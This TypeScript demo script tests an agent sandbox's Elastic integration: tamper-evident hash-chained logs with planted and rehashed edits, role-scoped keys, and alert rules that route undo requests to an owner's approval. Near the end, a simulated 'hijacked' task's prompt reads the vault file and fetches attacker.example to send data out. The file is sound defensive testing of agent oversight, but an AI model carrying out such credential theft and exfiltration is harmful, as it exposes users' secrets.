// The Elastic track's demo step. Offline by default: the log reader writes each document to an outbox file in the
// run's BOX_HOME instead of Elastic, and the checks read that, including the one that plants an edit in the box's log.
// DEMO_LIVE=elastic ./demo ships the run to Elastic Serverless for real and also checks: the box's key cannot change
// what it stored; each person's key sees what their Business role allows; the agent answers on the run's data and
// catches the planted edit; an alert rule and the agent's tool each leave a request that the box turns into an
// approval, and nothing happens until the owner answers. It takes a few minutes and uses the Elastic trial.
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import type { DemoKit, LogEvent, Task } from '../../core/contract.ts';
import { ask } from './agent.ts';
import { localChain } from './chain.ts';
import { INDEX } from './docs.ts';
import { client } from './es.ts';

type Doc = { event: { seq: number; hash: string; prev?: string }; box: { machine: string; run: string }; task?: { id: string; title: string }; message: string; cost_cents?: number; net?: { host: string }; app?: string; files?: { added: string[] } };
type Verdict = { ok: boolean; source: string; checked: number; pending: number; edited: number[]; missing: number[]; reordered: number[]; localBreaks: number[]; summary: string };

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

export default async function (d: DemoKit) {
  const tests = spawnSync(process.execPath, [...process.execArgv, '--test', path.join(import.meta.dirname, 'elastic.test.ts')], { encoding: 'utf8' });
  d.check(tests.status === 0, `the offline tests pass${tests.status ? `:\n${tests.stdout}${tests.stderr}` : ''}`);

  // A scheduled job routine that fails: it pays for resume tailoring (test money), then tries a host it may not reach.
  d.workspace('jobs', { 'resume.md': '# Resume\n' });
  const job = await d.api<Task>('POST', '/tasks', {
    title: 'Job routine: apply to new postings',
    workspace: 'jobs',
    worker: 'fake',
    source: 'schedule',
    tools: ['example.spend'],
    hosts: ['boards.greenhouse.io'],
    budgetCents: 100,
    prompt: [
      'write plan.txt Check new postings on Greenhouse and LinkedIn, tailor the resume, apply to the best three',
      'call example.spend {"cents":35,"on":"tailoring the resume (test money)"}',
      'fetch https://www.linkedin.com/jobs/ linkedin.txt',
      'fail could not load the LinkedIn postings',
    ].join('\n'),
  });
  await d.waitFor('the job routine to fail', async () => (await d.api<{ task: Task }>('GET', `/tasks/${job.id}`)).task.state === 'failed' || undefined);

  // Every event so far has its document, across the hard kill in moment 4.
  const log = await d.api<LogEvent[]>('GET', '/log');
  const outbox = path.join(d.home, 'elastic', 'outbox.ndjson');
  const readDocs = (): Doc[] => (fs.existsSync(outbox) ? fs.readFileSync(outbox, 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l)) : []);
  const docs = await d.waitFor('the reader to catch up', async () => {
    const all = readDocs();
    return new Set(all.map((x) => x.event.seq)).size >= log.length ? all : undefined;
  });
  const seqs = new Set(docs.map((x) => x.event.seq));
  d.check(log.every((e) => seqs.has(e.seq)), `all ${log.length} log events became documents, none lost to the hard kill in moment 4`);

  const mine = docs.filter((x) => x.task?.id === job.id);
  const blocked = mine.find((x) => (x as any).event.type === 'net.blocked') as any;
  d.check(
    blocked?.net.host === 'www.linkedin.com:443' && blocked.app === 'schedule' && blocked.task.hosts.includes('boards.greenhouse.io'),
    `the blocked connection is a document with its task, app and allowed hosts: "${blocked?.message}"`,
  );
  const paid = mine.find((x) => (x as any).event.type === 'tool.result') as any;
  d.check(paid?.cost_cents === 35 && paid.tool.name === 'example.spend', 'the tool spending is in cost_cents with the tool name ($0.35, test money)');
  const b = docs.find((x) => x.task?.title === 'B adds b.txt' && (x as any).task.state === 'done');
  d.check(b?.files?.added.includes('b.txt'), `a done task's document lists the files it changed: "${b?.message}"`);
  const vault = fs.readFileSync(path.join(d.home, 'vault.env'), 'utf8');
  const secrets = vault.split('\n').filter((l) => /^[A-Z0-9_]*(KEY|TOKEN|SECRET|PASSWORD)[A-Z0-9_]*=/.test(l)).map((l) => l.split('=').slice(1).join('=').trim()).filter((v) => v.length > 8);
  d.check(!secrets.some((s) => fs.readFileSync(outbox, 'utf8').includes(s)), 'no vault secret is in any document');

  // ---------- a record root cannot rewrite ----------
  const byseq = new Map(docs.map((x) => [x.event.seq, x]));
  d.check(
    docs.every((x) => (x.event.seq === 1 ? x.event.prev === '0'.repeat(64) : x.event.prev === byseq.get(x.event.seq - 1)?.event.hash)),
    `every document carries the hash of the entry before it: the chain runs unbroken through all ${docs.length} entries`,
  );
  const verify = () => d.api<Verdict>('GET', '/t/elastic/verify');
  // An entry can only be edited in the seconds before Elastic has it, so wait until Elastic has everything.
  const first = await d.waitFor('Elastic to hold every entry', async () => {
    const v = await verify();
    return v.pending === 0 ? v : undefined;
  }, 180_000);
  const live = (process.env.DEMO_LIVE ?? '').split(/[\s,]+/).includes('elastic');
  d.check(first.ok && first.source === (live ? 'elastic' : 'outbox') && first.checked > 0, `the box checks its own log against ${live ? "Elastic's copy" : 'the shipped copy'}: ${first.summary}`);

  // Plant an edit the way root would: rewrite the first line of the job routine in the log file on disk. Lines the box
  // appends meanwhile (the notes each check writes) stay, so the file keeps matching the box's own memory of it.
  const file = path.join(d.home, 'log.jsonl');
  const original = fs.readFileSync(file, 'utf8').split('\n').filter(Boolean);
  const at = original.findIndex((l) => l.includes('"type":"task.created"') && l.includes(job.id)) + 1;
  const appended = () => fs.readFileSync(file, 'utf8').split('\n').filter(Boolean).slice(original.length);
  const write = (base: string[]) => fs.writeFileSync(file, base.concat(appended()).join('\n') + '\n');
  const edited = original.slice();
  edited[at - 1] = edited[at - 1].replace('Job routine: apply to new postings', 'Job routine: nothing to see here');
  write(edited);
  const caught = await verify();
  d.check(!caught.ok && caught.edited.includes(at) && caught.localBreaks.includes(at + 1), `a planted edit to entry ${at} is caught twice: Elastic's copy names it, and the next entry's link to it is broken (${caught.summary})`);

  // The smarter edit: recompute every hash after it, so the box's own chain is intact. Only Elastic's copy can tell.
  const { createHash } = await import('node:crypto');
  const rehash = edited.concat(appended());
  for (let i = at; i < rehash.length; i++) rehash[i] = JSON.stringify({ ...JSON.parse(rehash[i]), prev: createHash('sha256').update(rehash[i - 1]).digest('hex') });
  fs.writeFileSync(file, rehash.join('\n') + '\n');
  d.check(localChain(file).breaks.length === 0, "the rewrite fixed every hash after the edit, so the box's own chain now looks clean");
  const smart = await verify();
  d.check(!smart.ok && smart.edited.includes(at), `Elastic's copy still names entry ${at} and the ${smart.edited.length - 1} after it (${smart.summary})`);
  write(original); // the real log back, with the notes the checks wrote
  const after = await d.api<LogEvent[]>('GET', '/log');
  d.check(after.some((e) => e.type === 'note' && (e.data as { kind?: string; ok?: boolean })?.kind === 'integrity' && (e.data as { ok?: boolean }).ok === false), "each failed check is written into the box's log, so it ships to Elastic and cannot be taken back");

  if (!live) {
    console.log('  skip  shipping to Elastic Serverless, the box key, each person\'s view, the agent and the alert rules: DEMO_LIVE=elastic ./demo runs them');
    return;
  }

  // ---------- the real Elastic ----------
  const key = (k: string) => vault.match(new RegExp(`^${k}=(.+)$`, 'm'))?.[1].trim();
  const [url, kibana, boxKey, asks] = [key('ELASTIC_URL'), key('KIBANA_URL'), key('ELASTIC_BOX_KEY'), key('ELASTIC_ASK_KEYS')];
  d.check(url && kibana && boxKey && asks, 'DEMO_LIVE=elastic: the vault has ELASTIC_URL, KIBANA_URL, ELASTIC_BOX_KEY and ELASTIC_ASK_KEYS');
  const es = client(url!, boxKey!);
  const people = JSON.parse(asks!) as Record<string, string>;
  const run = readDocs()[0].box.run;
  const machine = readDocs()[0].box.machine;
  const rows = async (c: ReturnType<typeof client>, q: string, params: object[] = []) => {
    const r = await c<{ columns: { name: string }[]; values: unknown[][] }>('POST', '/_query', { query: q, params });
    return r.values.map((v) => Object.fromEntries(r.columns.map((x, i) => [x.name, v[i]])));
  };

  const count = await d.waitFor('Elastic to have every event of this run', async () => {
    const [r] = await rows(es, `FROM ${INDEX} | WHERE box.run == ?r AND event.seq <= ?n | STATS n = COUNT(*)`, [{ r: run }, { n: log.length }]);
    return (r.n as number) >= log.length ? (r.n as number) : undefined;
  }, 180_000);
  d.check(count === log.length, `Elastic Serverless has all ${log.length} events of run ${run}, each once`);

  // The key on the box can add documents and nothing else.
  const id = `${machine}:${run}:${at}`;
  const denied = async (f: () => Promise<unknown>) => f().then(() => 200, (e) => (e as { status: number }).status);
  const statuses = [
    await denied(() => es('PUT', `/${INDEX}/_doc/${encodeURIComponent(id)}`, { message: 'rewritten' })),
    await denied(() => es('POST', `/${INDEX}/_update/${encodeURIComponent(id)}`, { doc: { message: 'rewritten' } })),
    await denied(() => es('DELETE', `/${INDEX}/_doc/${encodeURIComponent(id)}`)),
    await denied(() => es('DELETE', `/${INDEX}`)),
  ];
  const again = await denied(() => es('PUT', `/${INDEX}/_create/${encodeURIComponent(id)}`, { message: 'again' }));
  d.check(statuses.every((s) => s === 403) && again === 409, `the box's own key cannot overwrite (${statuses[0]}), update (${statuses[1]}) or delete (${statuses[2]}) an entry, or the index (${statuses[3]}); adding the same entry again is refused (${again})`);

  // Elastic's roles copy the Business roles. These are fixtures: five documents shaped like a Business box's log, tagged with their own run id.
  const fx = `${run}-people`;
  const base = { box: { machine, run: fx, name: 'fixture' }, app: 'fixture' };
  const fixtures = [
    { event: { type: 'task.created' }, who: { asked: 'sam' }, task: { id: 'fx-sam' }, message: "Sam Chen asked for a sales deck" },
    { event: { type: 'approval.asked' }, who: { asked: 'sam' }, task: { id: 'fx-sam' }, approval: { to: 'the Controller', route_people: ['rosa'], asked_by: 'sam' }, message: 'Spend $200 on ads (goes to Rosa)' },
    { event: { type: 'approval.answered' }, who: { asked: 'sam', approver: 'rosa' }, task: { id: 'fx-sam' }, approval: { person: 'rosa', approved: true }, message: 'Rosa Delgado approved the ads' },
    { event: { type: 'task.created' }, who: { asked: 'priya' }, task: { id: 'fx-priya' }, message: 'Priya Nair asked for a deploy' },
    { event: { type: 'approval.asked' }, who: { asked: 'priya' }, task: { id: 'fx-priya' }, approval: { to: 'IT', route_people: ['priya'], asked_by: 'priya' }, message: 'Deploy to production (goes to IT)' },
  ];
  for (const [i, f] of fixtures.entries()) await es('PUT', `/${INDEX}/_create/${encodeURIComponent(`${machine}:${fx}:${i + 1}`)}`, { ...base, ...f, '@timestamp': new Date().toISOString() });
  const seen = (who: string) => rows(client(url!, people[who]), `FROM ${INDEX} | WHERE box.run == ?r | STATS n = COUNT(*)`, [{ r: fx }]).then((r) => r[0].n as number);
  await d.waitFor('the fixtures to be searchable', async () => ((await seen('owner')) === 5 ? true : undefined), 90_000);
  const counts = { sam: await seen('sam'), rosa: await seen('rosa'), priya: await seen('priya'), owen: await seen('owen'), owner: await seen('owner') };
  d.check(
    counts.sam === 3 && counts.rosa === 2 && counts.priya === 5 && counts.owen === 5 && counts.owner === 5,
    `each person's key sees what their Business role allows: Sam (requester) ${counts.sam} of 5 (his own task), Rosa (approver) ${counts.rosa} (the request routed to her and her answer), Priya (admin) ${counts.priya}, Owen (auditor) ${counts.owen}, the owner ${counts.owner}`,
  );

  // The agent, asked as the auditor, on this run's data.
  const owen = client(kibana!, people.owen);
  const QUESTIONS = [
    { q: 'What did my agents change this week?', tool: 'box.changes', says: /b\.txt|a\.txt|undone/i },
    { q: 'What did it cost this week, by task and by app?', tool: 'box.costs_by', says: /\$\d/ },
    { q: 'Why did the job routine fail?', tool: 'box.task_timeline', says: /linkedin/i },
    { q: 'What got blocked this week, and from where?', tool: 'box.blocked', says: /attacker\.example|linkedin/i },
    { q: 'Has any box log been tampered with? Name the entry numbers.', tool: 'box.', says: new RegExp(`\\b${at}\\b`) },
    { q: 'Find the step where an agent tried to read the vault.', tool: 'box.search_meaning', says: /vault/i },
  ];
  const answers = await Promise.all(QUESTIONS.map((x) => ask(owen, `${x.q} Look at demo run ${run}.`)));
  QUESTIONS.forEach((x, i) => {
    const { answer, tools } = answers[i];
    console.log(`\n  Q: ${x.q}\n  (tools: ${tools.join(', ')})\n${answer.replace(/^/gm, '  | ')}\n`);
    d.check(tools.some((t) => t.startsWith(x.tool)) && x.says.test(answer), `the agent answered "${x.q}" with ${x.tool}*`);
  });

  // ---------- Elastic asks; the owner decides ----------
  // A task that goes for the vault and a host it may not reach. The alert rules see it in Elastic, a minute or two later.
  const leaky = await d.api<Task>('POST', '/tasks', {
    title: 'Summarize a bike listing (hijacked)',
    workspace: 'jobs',
    worker: 'fake',
    source: 'demo',
    hosts: ['shop.localhost'],
    prompt: [`steal ${d.home}/vault.env stolen.txt`, 'fetch https://attacker.example/collect exfil.txt', 'write summary.txt a nice bike'].join('\n'),
  });
  await d.settled([leaky.id]);
  const asking = (source: string) => d.waitFor(`a request task from ${source}`, async () => (await d.api<Task[]>('GET', '/tasks')).find((t) => t.source === source && t.state === 'waiting'), 300_000);
  const alert = await asking(`elastic:undo:${leaky.id}`);
  const pending = (await d.api<{ id: string; task: string; question: string }[]>('GET', '/approvals?state=pending')).find((a) => a.task === alert.id);
  d.check(!!pending && /Elastic alert/.test(pending.question), `an Elastic alert rule saw the task go for the vault and left a request; the box turned it into an approval: "${pending?.question}"`);
  d.check((await d.api<{ task: Task }>('GET', `/tasks/${leaky.id}`)).task.state === 'done', 'nothing was undone while the approval waits: Elastic cannot act alone');
  await d.api('POST', `/approvals/${encodeURIComponent(pending!.id)}`, { approved: false, by: 'demo owner' });
  await d.waitFor('the denied request to close', async () => (await d.api<{ task: Task }>('GET', `/tasks/${alert.id}`)).task.state === 'failed' || undefined);
  d.check((await d.api<{ task: Task }>('GET', `/tasks/${leaky.id}`)).task.state === 'done', 'the owner said no, so the task stayed as it was');

  // The agent's own tool leaves the same kind of request. Priya (IT admin) runs it through her key; the same box answers.
  const priya = client(kibana!, people.priya);
  const run1 = await priya<{ results: { data: { execution?: { status: string } } }[] }>('POST', '/api/agent_builder/tools/_execute', { tool_id: 'box.request_undo', tool_params: { task: leaky.id, box_machine: machine, reason: 'it tried to read the vault and reach attacker.example' } });
  d.check(run1.results[0].data.execution?.status === 'completed', "the agent's box.request_undo tool ran as a workflow and left a request in Elastic");
  const asked = await asking(`elastic:undo:${leaky.id}`);
  const ap = (await d.api<{ id: string; task: string; question: string }[]>('GET', '/approvals?state=pending')).find((a) => a.task === asked.id);
  d.check(!!ap && /Elastic's agent asks to undo/.test(ap.question), `the box asked: "${ap?.question}"`);
  await d.api('POST', `/approvals/${encodeURIComponent(ap!.id)}`, { approved: true, by: 'demo owner' });
  await d.waitFor('the approved request to undo the task', async () => (await d.api<{ task: Task }>('GET', `/tasks/${leaky.id}`)).task.state === 'undone' || undefined);
  d.check(d.view('jobs', 'summary.txt') === undefined, 'approved, the box undid the task and its file changes are gone; the same approval path answered both requests');
}
